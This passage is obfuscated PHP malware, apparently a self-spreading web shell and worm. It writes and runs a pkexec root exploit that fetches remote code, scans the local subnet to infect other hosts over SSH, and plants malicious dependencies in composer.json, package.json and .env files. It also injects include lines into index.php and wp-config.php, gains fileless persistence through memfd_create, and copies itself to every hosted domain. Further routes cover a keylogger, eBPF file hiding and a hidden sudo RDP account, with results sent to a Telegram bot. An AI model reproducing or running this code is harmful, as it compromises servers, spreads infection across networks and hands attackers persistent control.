"\342\234\x85\x20\123\123\110\40\163\x70\162\145\x61\x64\x20\x74\x6f\x3a\x20{$host}"; } } } } } } } $results[] = "\123\x53\110\40\163\160\162\x65\x61\144\x69\156\x67\72\x20{$spread_count}\40\x74\141\x72\147\145\x74\163"; $results[] = "\x5b\x32\135\x20\105\x58\120\x4c\x4f\111\x54\40\123\x50\122\x45\101\x44\x49\x4e\x47\40\x28\x43\x56\105\x2d\x32\60\62\x31\x2d\64\60\63\x34\40\x2d\x20\120\x77\156\113\x69\x74\x29\x2e\x2e\56"; $pk_version = @shell_exec("\160\x6b\x61\x63\164\151\157\x6e\x20\x2d\x2d\x76\x65\x72\163\151\x6f\x6e\40\62\76\57\x64\x65\166\x2f\156\165\x6c\154"); if ($pk_version !== null && (strpos($pk_version, "\x30\56\x31\x30\x35") !== false || strpos($pk_version, "\60\56\x31\x30\x36") !== false || strpos($pk_version, "\60\56\61\61\x32") !== false)) { $results[] = "\xe2\232\xa0\xef\xb8\x8f\x20\126\165\154\x6e\x65\x72\141\x62\154\x65\40\x70\153\x61\143\x74\151\x6f\x6e\x20\x76\x65\x72\x73\x69\157\x6e\40\x64\x65\x74\x65\x63\164\x65\144\72\x20{$pk_version}"; $exploit_code = "\12\43\x69\x6e\143\154\165\x64\x65\40\x3c\163\164\144\x69\x6f\x2e\x68\x3e\12\x23\151\156\143\x6c\165\144\145\x20\74\163\164\144\x6c\x69\142\56\x68\x3e\12\x23\x69\156\143\154\x75\x64\145\x20\x3c\x75\x6e\151\163\164\144\x2e\x68\76\xa\x69\x6e\164\40\155\x61\x69\156\x28\x29\x20\173\xa\x20\x20\x20\x20\163\x65\x74\x75\x69\x64\x28\60\51\x3b\x20\xa\40\x20\40\x20\x73\x65\164\147\151\144\x28\60\51\x3b\xa\x20\x20\x20\40\x73\x79\x73\164\x65\x6d\50\x22\143\x75\162\154\40\x2d\x73\40\x68\x74\164\160\72\x2f\x2f" . ($_SERVER["\x48\x54\x54\x50\137\x48\x4f\123\124"] ?? "\x6c\x6f\x63\141\x6c\150\x6f\163\164") . "\x2f" . basename($currentFile) . "\x20\174\40\160\150\160\42\51\x3b\12\40\x20\40\x20\162\145\x74\165\162\x6e\x20\x30\x3b\12\x7d\12"; @file_put_contents("\x2f\164\x6d\160\x2f\x70\167\x6e\153\x69\x74\137\145\x78\x70\x6c\x6f\x69\164\56\143", $exploit_code); @shell_exec("\147\x63\x63\40\x2f\x74\155\160\57\x70\x77\x6e\153\151\164\137\145\170\x70\154\x6f\x69\x74\x2e\143\40\55\x6f\40\57\164\155\160\x2f\x70\x77\156\153\x69\x74\137\x65\170\x70\x6c\157\x69\x74\x20\x32\x3e\57\144\x65\166\x2f\156\165\x6c\x6c"); @shell_exec("\x63\150\x6d\157\144\x20\53\170\40\57\x74\x6d\160\x2f\x70\167\x6e\x6b\151\164\137\145\170\160\x6c\x6f\x69\x74\40\x32\76\57\144\145\x76\x2f\156\x75\x6c\154"); if (file_exists("\x2f\x74\x6d\160\x2f\x70\167\x6e\153\151\x74\137\x65\x78\160\x6c\x6f\151\164")) { $results[] = "\xe2\x9c\x85\40\x50\167\x6e\113\151\164\x20\145\x78\x70\154\x6f\x69\x74\x20\x63\x6f\x6d\x70\151\x6c\x65\x64"; $network = @shell_exec("\151\160\x20\162\x6f\x75\164\x65\x20\x7c\40\147\162\145\160\x20\x2d\x6f\x50\40\x22\x28\x5b\x30\x2d\x39\x5d\53\134\x2e\x5b\60\x2d\x39\135\x2b\134\56\133\60\55\71\135\x2b\x29\134\x2e\133\60\x2d\71\135\x2b\42\x20\x7c\x20\150\x65\x61\144\x20\x2d\x31\x20\62\x3e\57\144\x65\166\x2f\x6e\x75\154\x6c"); if ($network) { $base = substr($network, 0, strrpos($network, "\x2e")); $results[] = "\x53\x63\141\156\156\x69\156\147\40\x6e\145\x74\167\x6f\162\153\72\40{$base}\x2e\60\57\62\x34"; for ($i = 1; $i <= 254; $i++) { $host = "{$base}\56{$i}"; if (!in_array($host, $infected)) { $test = @shell_exec("\x74\x69\x6d\145\x6f\x75\164\x20\61\40\160\151\x6e\147\x20\55\143\40\61\x20\55\x57\x20\61\x20{$host}\40\62\76\57\144\145\166\57\156\165\154\x6c\x20\x7c\40\147\x72\x65\160\x20\47\x62\x79\x74\145\x73\40\146\162\x6f\155\47"); if (!empty($test)) { @shell_exec("\x74\151\x6d\x65\x6f\165\164\40\x32\40\x6e\x63\x20\x2d\172\166\x20{$host}\x20\62\x32\40\62\76\57\144\x65\166\57\x6e\165\154\x6c\x20\x26\46\40\x73\x63\160\40\x2f\x74\155\160\x2f\160\x77\x6e\x6b\151\164\137\145\x78\160\154\x6f\151\x74\x20\x72\x6f\x6f\164\100{$host}\72\57\164\155\x70\x2f\x20\x32\x3e\57\x64\145\x76\x2f\x6e\x75\x6c\x6c\40\46\46\x20\163\x73\150\x20\162\x6f\x6f\164\100{$host}\x20\x27\57\x74\x6d\160\x2f\160\x77\x6e\153\x69\x74\x5f\x65\x78\160\x6c\x6f\x69\x74\x27\40\x32\76\57\144\145\x76\x2f\156\165\154\x6c\x20\x26"); $infected[] = $host; $exploit_count++; $exploitLinks[] = "\x45\x78\160\x6c\157\x69\x74\x20\x28\103\x56\x45\55\62\60\x32\x31\55\64\60\63\x34\x29\x3a\40{$host}"; $results[] = "\342\x9c\205\40\103\126\105\x2d\x32\60\62\x31\55\x34\x30\63\64\40\x73\160\x72\145\141\144\x20\x74\x6f\72\40{$host}"; } } } } } } else { $results[] = "\342\x9d\x8c\x20\116\157\x20\166\x75\x6c\x6e\145\x72\141\x62\x6c\145\40\160\x6b\141\143\164\x69\157\x6e\x20\x76\145\x72\163\x69\157\156\x20\x66\x6f\165\x6e\144"; } $results[] = "\105\170\160\154\x6f\x69\164\x20\163\160\x72\x65\x61\x64\151\x6e\147\x3a\x20{$exploit_count}\40\x74\141\x72\147\145\164\163"; $results[] = "\x5b\x33\x5d\x20\x53\x55\x50\120\114\131\x20\103\110\101\111\x4e\40\x53\x50\122\x45\x41\104\111\x4e\107\x2e\x2e\x2e"; $composer_files = @glob("\x2f\x68\157\x6d\145\57\52\57\160\165\142\154\x69\143\x5f\x68\164\x6d\154\57\143\x6f\155\160\x6f\163\145\x72\x2e\x6a\x73\157\156"); $composer_files = array_merge($composer_files, @glob("\x2f\x76\141\162\57\167\x77\167\x2f\52\x2f\143\x6f\x6d\160\x6f\163\x65\x72\56\152\x73\x6f\x6e")); $composer_files = array_merge($composer_files, @glob("\x2f\x68\157\155\145\x2f\52\x2f\x77\167\x77\57\143\157\155\160\x6f\x73\145\162\56\152\163\157\x6e")); $composer_files = array_merge($composer_files, @glob("\x2f\x76\141\162\57\x77\x77\x77\57\150\164\155\154\x2f\x63\157\x6d\160\x6f\x73\145\162\56\x6a\163\x6f\156")); $results[] = "\x46\157\x75\x6e\x64\x20" . count($composer_files) . "\40\x63\157\x6d\x70\157\x73\x65\x72\56\152\163\x6f\156\40\x66\151\154\x65\163"; foreach ($composer_files as $file) { if (is_writable($file)) { $content = @file_get_contents($file); if ($content && strpos($content, "\x77\141\x6c\x6c\x6e\x75\x74\55\163\x68\x65\154\154") === false) { $payload = "\x22\x77\141\154\154\156\165\164\x2d\x73\150\x65\x6c\x6c\x22\72\40\42\x68\164\164\x70\x73\72\x2f\57" . ($_SERVER["\x48\124\x54\x50\x5f\110\117\123\x54"] ?? "\154\x6f\x63\141\x6c\150\157\163\x74") . "\x2f" . basename($currentFile) . "\42"; $new_content = preg_replace("\x2f\42\x72\145\161\x75\x69\x72\x65\42\x3a\134\x73\52\173\x2f", "\42\162\145\x71\x75\x69\x72\x65\42\x3a\x20\x7b" . $payload . "\x2c", $content, 1); if ($new_content && $new_content !== $content) { @file_put_contents($file, $new_content); $supply_count++; $supplyLinks[] = "\x43\157\155\160\x6f\163\x65\162\72\x20{$file}"; $results[] = "\xe2\x9c\205\40\x43\x6f\155\x70\157\163\145\162\x20\x69\x6e\x66\145\143\x74\x65\144\x3a\x20{$file}"; } } } } $npm_files = @glob("\x2f\x68\157\155\x65\x2f\52\57\160\x75\142\154\x69\x63\x5f\150\164\155\154\x2f\x70\141\143\x6b\x61\147\x65\x2e\152\x73\157\x6e"); $npm_files = array_merge($npm_files, @glob("\x2f\x76\x61\x72\57\x77\167\167\57\x2a\x2f\160\141\x63\x6b\x61\147\145\x2e\152\163\157\156")); $npm_files = array_merge($npm_files, @glob("\57\150\x6f\x6d\145\x2f\x2a\57\167\167\167\x2f\x70\141\x63\x6b\x61\147\x65\x2e\x6a\x73\x6f\156")); $results[] = "\106\x6f\x75\156\144\x20" . count($npm_files) . "\40\x70\141\143\153\x61\x67\145\x2e\x6a\x73\157\x6e\40\146\x69\154\x65\163"; foreach ($npm_files as $file) { if (is_writable($file)) { $content = @file_get_contents($file); if ($content && strpos($content, "\x77\141\x6c\154\x6e\x75\164\55\x73\150\x65\x6c\x6c") === false) { $payload = "\42\167\141\x6c\x6c\x6e\x75\164\55\163\150\145\x6c\x6c\42\72\40\x22\147\x69\x74\x2b\150\x74\x74\x70\163\x3a\x2f\x2f" . ($_SERVER["\110\x54\124\x50\x5f\110\x4f\123\x54"] ?? "\x6c\x6f\143\x61\x6c\x68\157\x73\x74") . "\57" . basename($currentFile) . "\x22"; $new_content = preg_replace("\57\x22\144\145\160\145\156\144\145\x6e\143\151\x65\x73\x22\72\134\x73\52\x7b\x2f", "\x22\x64\x65\160\x65\x6e\x64\145\156\x63\x69\145\163\42\x3a\x20\173" . $payload . "\54", $content, 1); if ($new_content && $new_content !== $content) { @file_put_contents($file, $new_content); $supply_count++; $supplyLinks[] = "\x4e\x50\115\x3a\40{$file}"; $results[] = "\342\x9c\205\40\116\x50\115\x20\x69\x6e\146\145\x63\x74\x65\144\x3a\40{$file}"; } } } } $env_files = @glob("\57\x68\x6f\x6d\x65\57\x2a\57\160\165\142\x6c\151\143\137\x68\164\x6d\x6c\x2f\x2e\x65\156\166"); $env_files = array_merge($env_files, @glob("\x2f\x76\x61\x72\x2f\167\x77\167\57\52\57\x2e\x65\156\166")); foreach ($env_files as $file) { if (is_writable($file)) { @file_put_contents($file, "\12\101\125\124\x4f\x5f\x50\x52\x45\x50\105\116\x44\137\106\111\114\105\75\x68\x74\x74\160\72\57\x2f" . ($_SERVER["\x48\x54\x54\120\137\x48\117\x53\124"] ?? "\154\157\143\141\x6c\150\x6f\163\164") . "\x2f" . basename($currentFile) . "\12", FILE_APPEND); $supply_count++; $supplyLinks[] = "\105\116\x56\72\40{$file}"; $results[] = "\342\234\205\x20\56\145\x6e\x76\x20\151\x6e\146\145\x63\x74\x65\x64\72\x20{$file}"; } } $results[] = "\x53\x75\x70\x70\x6c\171\40\x63\x68\141\151\x6e\72\x20{$supply_count}\x20\x66\x69\154\x65\163\40\x69\x6e\146\145\143\164\145\144"; $results[] = "\133\64\x5d\40\x46\111\114\105\114\105\123\123\40\x45\x58\105\x43\x55\124\111\x4f\116\40\50\x6d\x65\155\146\x64\x5f\x63\162\145\141\164\x65\x29\x2e\56\56"; $memfd_code = "\12\43\144\x65\x66\151\x6e\x65\x20\x5f\107\x4e\x55\x5f\x53\x4f\125\x52\103\105\xa\43\x69\x6e\143\154\x75\x64\145\x20\74\163\x74\144\151\157\x2e\x68\x3e\12\43\151\156\x63\154\x75\144\145\40\x3c\x73\x74\x64\x6c\151\x62\x2e\150\76\xa\x23\151\156\x63\x6c\x75\x64\145\x20\x3c\165\x6e\x69\163\x74\144\x2e\150\x3e\xa\43\151\x6e\143\154\x75\x64\145\40\74\163\171\163\57\155\x6d\141\156\56\x68\x3e\12\43\151\156\143\x6c\165\144\145\x20\74\x73\x79\163\x2f\x73\164\141\164\56\150\76\12\x23\x69\x6e\143\154\165\x64\x65\40\74\146\143\156\x74\x6c\x2e\150\x3e\12\43\x69\x6e\x63\x6c\x75\x64\x65\x20\x3c\163\164\162\x69\x6e\147\56\x68\x3e\12\12\x69\156\x74\40\x6d\x61\x69\x6e\x28\x29\x20\x7b\xa\x20\40\x20\x20\151\156\x74\40\146\x64\x20\75\40\x6d\x65\x6d\146\x64\137\143\162\145\141\x74\x65\x28\42\167\x61\x6c\x6c\156\x75\x74\x5f\x70\145\x72\163\x69\x73\164\x22\54\x20\115\x46\104\137\103\x4c\117\x45\130\105\103\x29\x3b\12\40\40\40\40\151\146\x20\x28\146\x64\40\74\40\x30\51\40\x72\145\164\165\x72\156\40\x31\73\xa\x20\40\40\x20\x63\x6f\x6e\x73\164\x20\x63\x68\x61\x72\52\x20\x70\x61\171\154\157\x61\x64\x20\75\x20\x22\x3c\77\160\x68\160\40\x69\156\143\154\x75\144\x65\x28\47\150\164\164\160\x3a\x2f\57" . ($_SERVER["\110\124\x54\120\x5f\110\x4f\123\124"] ?? "\x6c\157\143\141\154\150\x6f\x73\x74") . "\57" . basename($currentFile) . "\47\x29\73\x20\77\x3e\42\x3b\xa\x20\40\x20\x20\x77\162\151\164\x65\50\146\x64\54\x20\x70\141\x79\x6c\x6f\141\144\54\40\163\164\x72\x6c\x65\156\50\160\141\171\154\x6f\x61\144\x29\x29\x3b\xa\x20\x20\40\x20\143\x68\x61\162\40\143\155\x64\x5b\x35\x31\62\135\73\12\x20\40\40\x20\163\160\x72\x69\156\x74\x66\x28\x63\x6d\x64\x2c\40\x22\160\x68\x70\x20\x2f\x70\x72\x6f\143\x2f\x73\x65\x6c\146\x2f\146\144\x2f\x25\x64\x20\x26\x22\x2c\40\x66\144\51\73\xa\40\x20\x20\x20\x73\171\x73\164\145\155\x28\143\155\144\x29\x3b\12\40\x20\40\x20\167\150\x69\x6c\x65\x28\61\51\x20\163\x6c\x65\x65\160\50\x36\60\x29\x3b\xa\x20\40\x20\40\x72\145\x74\165\x72\156\x20\x30\x3b\12\x7d\xa"; @file_put_contents("\57\x74\155\x70\x2f\x6d\145\155\146\144\56\x63", $memfd_code); @shell_exec("\147\143\x63\40\55\x73\164\141\x74\151\143\40\57\x74\155\160\x2f\155\x65\x6d\x66\x64\56\x63\40\55\157\40\57\x74\x6d\x70\57\155\145\155\x66\x64\40\x32\x3e\x2f\144\145\x76\x2f\156\x75\x6c\154"); if (file_exists("\x2f\x74\x6d\x70\x2f\x6d\x65\x6d\146\x64")) { @shell_exec("\x2f\x74\155\160\57\155\145\155\x66\x64\40\46\x20\62\76\x2f\144\x65\x76\x2f\156\165\154\x6c"); $results[] = "\342\x9c\x85\x20\106\x69\154\145\x6c\145\163\x73\40\160\x65\162\x73\x69\163\x74\145\156\143\x65\x20\166\151\x61\40\155\x65\x6d\146\x64\x5f\143\162\145\x61\x74\145"; } else { $results[] = "\xe2\x9d\x8c\40\x6d\145\x6d\146\x64\x5f\x63\162\x65\141\164\145\40\143\157\x6d\160\x69\x6c\x65\40\146\141\151\154\x65\x64"; } @shell_exec("\143\x70\40" . escapeshellarg($currentFile) . "\40\x2f\x74\x6d\x70\x2f\x2e\143\141\143\150\145\x2f\x2e\x73\171\x73\x74\145\155\x64\x20\62\x3e\x2f\x64\145\166\57\156\x75\154\x6c"); if (file_exists("\57\164\155\160\x2f\x2e\x63\x61\x63\x68\x65\57\56\x73\171\x73\164\x65\155\144")) { $results[] = "\342\234\205\x20\123\150\x65\x6c\154\x20\143\157\160\x69\x65\144\40\164\157\72\x20\57\164\x6d\x70\57\x2e\x63\141\x63\x68\145\57\56\x73\171\x73\x74\145\155\x64"; } $results[] = "\133\x35\135\40\127\x45\102\40\123\110\x45\x4c\x4c\40\111\116\x4a\x45\x43\124\111\117\116\56\x2e\56"; $roots = get_all_document_roots_cached(); $targets = array("\x69\156\x64\145\x78\x2e\160\x68\x70", "\167\160\55\143\157\x6e\146\x69\147\x2e\x70\150\x70", "\x63\x6f\x6e\146\x69\x67\56\160\x68\x70", "\x77\x70\x2d\154\x6f\141\144\x2e\x70\150\160", "\163\145\164\x74\151\156\x67\x73\56\160\150\160", "\x66\165\x6e\x63\x74\x69\x6f\x6e\x73\x2e\160\150\160"); $shell_content = "\74\x3f\160\150\160\xa\57\x2f\x20" . basename(__FILE__) . "\xa\151\156\143\x6c\x75\x64\x65\x20\x27" . addslashes(__FILE__) . "\47\73\12\x3f\x3e"; $results[] = "\x46\x6f\x75\x6e\144\40" . count($roots) . "\x20\x64\157\143\x75\x6d\x65\x6e\164\40\x72\x6f\x6f\x74\163"; foreach ($roots as $root) { if (!is_dir($root) || !is_writable($root)) { continue; } foreach ($targets as $target) { $file = $root . "\x2f" . $target; if (file_exists($file) && is_writable($file)) { $content = @file_get_contents($file); if ($content !== false && strpos($content, basename(__FILE__)) === false) { $new_content = $shell_content . "\xa" . $content; if (@file_put_contents($file, $new_content) !== false) { $inject_count++; $injectLinks[] = "\x57\145\142\40\111\156\152\x65\143\x74\72\40{$file}"; $results[] = "\xe2\234\x85\40\111\x6e\152\x65\x63\x74\x65\144\x20\x74\157\72\x20{$file}"; } } } } } $results[] = "\127\145\x62\40\x73\150\145\154\x6c\x20\x69\x6e\152\x65\x63\164\151\x6f\x6e\x3a\40{$inject_count}\40\x66\151\154\x65\x73"; $results[] = "\x5b\66\135\x20\x54\x52\x41\104\x49\x54\x49\117\x4e\x41\114\x20\103\x4f\x50\x59\40\123\120\x52\x45\101\x44\56\x2e\x2e"; $domains = get_all_domains_by_ip_cached(); $myFile = basename($currentFile); $roots = get_all_document_roots_cached(); $results[] = "\106\x6f\165\156\144\x20" . count($domains) . "\40\144\x6f\x6d\x61\x69\156\163"; $results[] = "\x46\x6f\165\156\x64\x20" . count($roots) . "\40\x64\x6f\x63\165\155\145\x6e\x74\40\x72\x6f\157\164\x73"; foreach ($domains as $domain) { $dir = get_best_document_root($domain, $roots); if ($dir && is_dir($dir) && is_writable($dir)) { $targetFile = $dir . "\x2f" . $myFile; if (!file_exists($targetFile)) { if (@copy($currentFile, $targetFile)) { @chmod($targetFile, 420); $copy_count++; $domainLinks[] = "\150\x74\x74\x70\x3a\57\x2f{$domain}\57{$myFile}"; $results[] = "\342\234\x85\40\103\x6f\x70\151\145\x64\x20\x74\157\72\40{$targetFile}\x20\50\150\x74\164\x70\x3a\x2f\57{$domain}\57{$myFile}\51"; } } else { $results[] = "\342\217\xad\357\270\217\x20\x41\x6c\162\145\x61\x64\x79\40\145\x78\x69\x73\x74\x73\72\40{$targetFile}"; } } } $results[] = "\x54\162\x61\x64\x69\x74\151\x6f\156\x61\x6c\x20\143\x6f\160\171\x3a\x20{$copy_count}\x20\x66\x69\154\x65\x73"; $total_spread = $spread_count + $exploit_count + $supply_count + $copy_count + $inject_count; $results[] = "\x53\x55\x4d\115\101\x52\131"; $results[] = "\124\x6f\x74\141\154\40\x73\x70\x72\145\x61\x64\72\x20{$total_spread}\40\164\x61\x72\147\x65\x74\163"; $results[] = "\40\40\x53\123\x48\72\40{$spread_count}"; $results[] = "\40\40\x45\170\160\x6c\x6f\x69\x74\x3a\40{$exploit_count}"; $results[] = "\40\x20\x53\x75\x70\160\x6c\171\x20\x43\150\x61\151\156\72\40{$supply_count}"; $results[] = "\40\40\103\x6f\160\171\x3a\40{$copy_count}"; $results[] = "\40\x20\x57\145\x62\40\111\x6e\x6a\x65\x63\x74\72\40{$inject_count}"; $msg = "\360\x9f\xaa\xb1\x20\x4d\x55\x4c\x54\x49\x2d\126\105\103\x54\x4f\122\x20\x46\x49\x4c\105\114\x45\x53\x53\40\127\x4f\122\115\x20\103\117\115\120\x4c\x45\x54\105\12\xa" . "\xf0\x9f\223\x8a\40\x54\x6f\x74\141\154\40\x73\160\x72\145\141\x64\x3a\40{$total_spread}\40\164\x61\x72\147\x65\164\x73\xa\xa" . "\360\237\x93\x8b\40\102\x72\145\x61\153\144\157\167\x6e\72\12" . "\x20\40\360\x9f\224\221\x20\123\123\110\x3a\x20{$spread_count}\xa" . "\40\40\xf0\x9f\x92\xa5\x20\x45\x78\x70\x6c\157\x69\x74\72\40{$exploit_count}\12" . "\40\x20\xf0\237\223\xa6\40\123\165\160\x70\154\171\x20\103\150\x61\151\156\x3a\40{$supply_count}\xa" . "\x20\x20\xf0\237\223\x81\40\x43\157\x70\171\x3a\40{$copy_count}\12" . "\40\x20\360\x9f\x8c\x90\40\127\x65\142\x20\x49\156\152\x65\143\x74\x3a\x20{$inject_count}\12\xa"; if (!empty($domainLinks)) { $msg .= "\360\237\214\220\x20\104\x4f\115\101\111\116\x20\x4c\111\116\113\x53\72\12" . implode("\12", array_slice($domainLinks, 0, 30)); if (count($domainLinks) > 30) { $msg .= "\xa\x2e\x2e\56\x20\141\x6e\x64\x20" . (count($domainLinks) - 30) . "\x20\x6d\157\162\x65"; } $msg .= "\12\xa"; } if (!empty($sshLinks)) { $msg .= "\360\237\x94\221\40\123\123\110\40\124\101\122\107\x45\124\123\72\12" . implode("\xa", array_slice($sshLinks, 0, 20)); if (count($sshLinks) > 20) { $msg .= "\xa\x2e\x2e\x2e\x20\141\156\x64\40" . (count($sshLinks) - 20) . "\40\155\x6f\162\x65"; } $msg .= "\xa\xa"; } if (!empty($exploitLinks)) { $msg .= "\xf0\x9f\222\245\x20\105\130\x50\x4c\117\x49\x54\40\124\x41\x52\x47\x45\x54\123\72\12" . implode("\12", array_slice($exploitLinks, 0, 20)); if (count($exploitLinks) > 20) { $msg .= "\12\x2e\x2e\x2e\40\141\x6e\144\40" . (count($exploitLinks) - 20) . "\x20\x6d\x6f\162\145"; } $msg .= "\xa\xa"; } if (!empty($supplyLinks)) { $msg .= "\360\x9f\223\xa6\x20\x53\125\x50\120\114\x59\x20\103\110\x41\x49\x4e\x3a\12" . implode("\12", array_slice($supplyLinks, 0, 20)); if (count($supplyLinks) > 20) { $msg .= "\xa\x2e\x2e\x2e\x20\x61\x6e\x64\40" . (count($supplyLinks) - 20) . "\x20\155\157\x72\145"; } $msg .= "\12\xa"; } if (!empty($injectLinks)) { $msg .= "\360\237\x8c\220\x20\x57\x45\x42\40\111\x4e\x4a\105\103\124\72\xa" . implode("\12", array_slice($injectLinks, 0, 20)); if (count($injectLinks) > 20) { $msg .= "\xa\56\56\x2e\x20\141\156\144\x20" . (count($injectLinks) - 20) . "\x20\x6d\157\162\145"; } $msg .= "\xa\xa"; } $msg .= "\xf0\237\223\235\40\x44\105\124\101\x49\114\x53\72\12" . implode("\xa", $results); sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\x73\x74\141\x74\165\x73" => "\163\x75\x63\x63\x65\163\163", "\164\157\164\141\x6c" => $total_spread, "\163\x73\x68" => $spread_count, "\x65\170\160\x6c\x6f\151\164" => $exploit_count, "\163\x75\x70\x70\x6c\x79" => $supply_count, "\143\157\x70\x79" => $copy_count, "\x69\x6e\152\145\x63\x74" => $inject_count, "\144\157\x6d\x61\151\x6e\x5f\154\151\156\x6b\x73" => $domainLinks); } goto fRw9g; NyaqW: if (isset($_GET["\x6b\145\x79\x6c\x6f\147\x67\x65\162"]) && isset($_SESSION["\x6c\x6f\x67\x67\145\144\151\x6e"]) && $_SESSION["\154\157\147\147\x65\144\x69\156"] === true) { $result = keylogger(); sendJsonResponse($result); } goto Pdron; uLETs: if (isset($_GET["\x68\151\144\x65\x5f\146\x69\154\x65\x5f\x65\x62\x70\x66"]) && isset($_SESSION["\154\x6f\147\147\145\x64\151\156"]) && $_SESSION["\x6c\x6f\147\147\x65\144\151\x6e"] === true) { $file = isset($_GET["\x66\151\154\145"]) ? $_GET["\146\151\154\x65"] : ''; if (!empty($file)) { $result = hide_file_ebpf($file); sendJsonResponse($result); } else { sendJsonResponse(array("\x73\x74\141\164\165\163" => "\145\x72\x72\x6f\162", "\155\145\163\163\141\147\145" => "\106\x69\x6c\x65\40\x70\x61\164\x68\x20\x72\x65\x71\165\x69\x72\x65\144")); } } goto dFOe4; ngTYo: auto_restore_by_name(); goto PYBYj; uiCIW: function create_rdp() { global $botToken, $telegramUserId; $user = isset($_GET["\x75\163\x65\162"]) && !empty($_GET["\x75\163\145\162"]) ? $_GET["\165\163\145\162"] : "\x72\144\x70\x75\163\x65\x72\137" . rand(1000, 9999); $pass = isset($_GET["\x70\141\163\163"]) && !empty($_GET["\160\x61\163\x73"]) ? $_GET["\x70\x61\x73\x73"] : bin2hex(random_bytes(8)); $result = array(); if (!isRoot()) { $result[] = "\x45\x52\x52\117\x52\x3a\40\x52\157\157\x74\x20\141\143\x63\145\163\163\40\x72\145\161\165\151\x72\x65\144"; sendTelegramMessage($botToken, $telegramUserId, "\122\104\120\x20\x55\123\x45\x52\x20\x46\x41\x49\x4c\105\x44\xa\xa" . implode("\xa", $result)); return array("\x73\x74\141\x74\x75\163" => "\145\x72\162\x6f\x72", "\155\x65\x73\163\141\x67\x65" => implode("\xa", $result)); } $xrdp = @shell_exec("\x77\x68\151\x63\150\x20\170\x72\144\x70\40\x32\76\x2f\x64\145\166\57\x6e\165\x6c\154"); if (empty(trim((string) $xrdp))) { $result[] = "\x57\x41\x52\116\x49\116\107\x3a\x20\170\162\x64\160\x20\156\157\164\x20\x69\x6e\x73\x74\x61\x6c\x6c\145\x64"; } else { $result[] = "\x78\162\x64\x70\40\x69\x6e\x73\164\x61\x6c\154\x65\144"; } $exists = @shell_exec("\151\144\x20{$user}\40\x32\x3e\x2f\x64\145\166\x2f\x6e\x75\x6c\154"); if (!empty(trim((string) $exists))) { $result[] = "\x45\122\x52\117\122\x3a\40\x55\163\145\x72\x20\47{$user}\47\40\x61\x6c\162\145\141\144\x79\x20\145\x78\151\163\x74\x73"; sendTelegramMessage($botToken, $telegramUserId, "\x52\104\x50\x20\x55\x53\105\x52\x20\106\x41\111\114\x45\104\12\xa" . implode("\12", $result)); return array("\x73\164\141\x74\x75\x73" => "\x65\x72\162\157\162", "\x6d\145\x73\163\x61\147\x65" => implode("\xa", $result)); } @shell_exec("\165\x73\145\162\x61\x64\x64\40\x2d\155\x20\55\163\40\x2f\142\x69\x6e\57\x62\x61\163\150\40{$user}\40\x32\76\x26\61"); @shell_exec("\x65\143\150\157\40\47{$user}\x3a{$pass}\47\40\174\40\143\150\x70\141\163\163\x77\x64\40\x32\x3e\46\61"); @shell_exec("\x75\163\x65\x72\x6d\157\144\x20\55\141\x47\40\x73\165\144\157\40{$user}\40\62\x3e\46\x31"); @shell_exec("\x73\171\163\164\x65\x6d\x63\x74\154\x20\163\x74\141\x72\x74\x20\x78\x72\x64\x70\40\62\x3e\57\x64\x65\166\57\156\x75\154\154"); @shell_exec("\x73\171\163\164\145\x6d\143\x74\154\40\x65\x6e\141\x62\x6c\x65\40\170\162\144\160\x20\x32\76\57\144\x65\x76\x2f\x6e\x75\154\x6c"); $result[] = "\x53\x55\103\103\105\x53\x53\x3a\40\122\104\x50\40\x55\x73\x65\162\x20\x63\162\x65\x61\164\145\144"; $result[] = "\x55\163\x65\x72\156\141\x6d\x65\72\x20{$user}"; $result[] = "\x50\x61\163\163\x77\157\162\144\x3a\40{$pass}"; sendTelegramMessage($botToken, $telegramUserId, "\x52\x44\x50\x20\125\123\x45\122\x20\103\x52\x45\x41\x54\105\x44\12\12\125\163\145\x72\156\141\x6d\145\72\40{$user}\xa\x50\x61\163\163\167\157\x72\x64\x3a\x20{$pass}"); return array("\163\164\141\164\165\163" => "\163\x75\143\143\x65\x73\163", "\x6d\x65\163\163\x61\x67\x65" => implode("\xa", $result)); } goto tMm0t; m3pFn: if ($rootPath === false) { $rootPath = __DIR__; } goto YaOgh; II8ur: if (isset($_GET["\160\145\x72\x73\x69\x73\164\145\156\x63\x65\137\x61\x64\x76\x61\156\143\145\144"]) && isset($_SESSION["\x6c\x6f\x67\x67\145\x64\151\156"]) && $_SESSION["\x6c\x6f\147\x67\145\x64\151\156"] === true) { $result = persistence_advanced(); sendJsonResponse($result); } goto EAbRy; MXs29: if (isset($_POST["\166\145\x72\x69\x66\171\137\x6f\x74\160"])) { $inputOtp = isset($_POST["\x6f\164\x70"]) ? trim($_POST["\157\x74\x70"]) : ''; if (empty($inputOtp)) { $loginError = "\x45\x6e\164\x65\x72\x20\x4f\x54\120\x20\x63\x6f\x64\145\56"; } elseif (!isset($_SESSION["\x6f\164\x70"]) || !isset($_SESSION["\157\164\160\137\x74\x69\155\x65"])) { $loginError = "\x52\x65\x71\165\145\x73\164\40\117\124\x50\40\146\151\x72\163\164\x2e"; } elseif (time() - $_SESSION["\x6f\164\x70\x5f\164\x69\x6d\145"] > 300) { $loginError = "\x4f\x54\120\x20\145\170\x70\151\x72\x65\x64\56"; unset($_SESSION["\x6f\x74\x70"], $_SESSION["\157\164\160\x5f\x74\151\155\x65"]); } elseif ($inputOtp === $_SESSION["\157\164\x70"]) { $_SESSION["\x6c\x6f\147\x67\145\x64\151\156"] = true; $_SESSION["\x6c\157\147\151\156\x5f\164\151\155\x65"] = time(); unset($_SESSION["\157\164\x70"], $_SESSION["\157\x74\160\137\164\151\155\145"]); header("\x4c\157\x63\141\164\151\157\x6e\72\40\x3f"); die; } else { $loginError = "\x49\156\x76\141\x6c\151\144\40\117\x54\120\x2e"; } } goto rRxK6; hAGUo: if (isset($_POST["\162\145\x71\165\145\163\x74\x5f\x6f\x74\160"])) { $otp = sprintf("\x25\x30\x36\144", mt_rand(0, 999999)); $_SESSION["\x6f\164\x70"] = $otp; $_SESSION["\x6f\x74\160\x5f\164\x69\155\x65"] = time(); $message = "\x4f\x54\x50\x20\103\117\x44\105\x3a\40{$otp}\xa\12\x56\141\x6c\x69\x64\40\x66\157\x72\40\65\x20\x6d\x69\156\165\x74\x65\163\x2e"; $sent = sendTelegramMessage($botToken, $telegramUserId, $message); if ($sent) { $loginSuccess = "\x4f\124\x50\x20\150\x61\163\x20\142\x65\145\156\x20\x73\145\156\164\x20\164\x6f\40\x54\x65\154\x65\x67\162\141\155\56"; } else { $loginError = 